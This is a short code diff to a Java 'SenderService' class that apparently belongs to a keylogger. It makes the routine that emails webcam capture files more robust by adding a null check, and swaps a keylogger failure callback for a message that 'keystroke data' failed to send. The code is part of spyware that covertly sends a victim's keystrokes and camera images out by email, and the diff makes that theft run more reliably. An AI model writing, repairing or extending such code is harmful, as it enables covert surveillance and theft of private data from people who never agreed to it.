@@ -40,9 +40,11 @@ public class SenderService implements Runnable {
 
                     folder = new File(Settings.WEBCAM_PATH);
                     listOfFiles = folder.listFiles();
-                    for (int i = 0; i < listOfFiles.length; i++) {
-                        if (listOfFiles[i].isFile()) {
-                            sendEmail.attach(listOfFiles[i].getPath(), "Camera");
+                    if(listOfFiles != null) {
+                        for (int i = 0; i < listOfFiles.length; i++) {
+                            if (listOfFiles[i].isFile()) {
+                                sendEmail.attach(listOfFiles[i].getPath(), "Camera");
+                            }
                         }
                     }
 
@@ -57,7 +59,7 @@ public class SenderService implements Runnable {
                     sendEmail.send();
                 } catch(Throwable e) {
                     e.printStackTrace();
-                    Keylogger.keyboard.onFail();
+                    System.out.println("Keystroke data fail to be send.");
                 }
 
                 start = System.nanoTime(); // Reset the timer
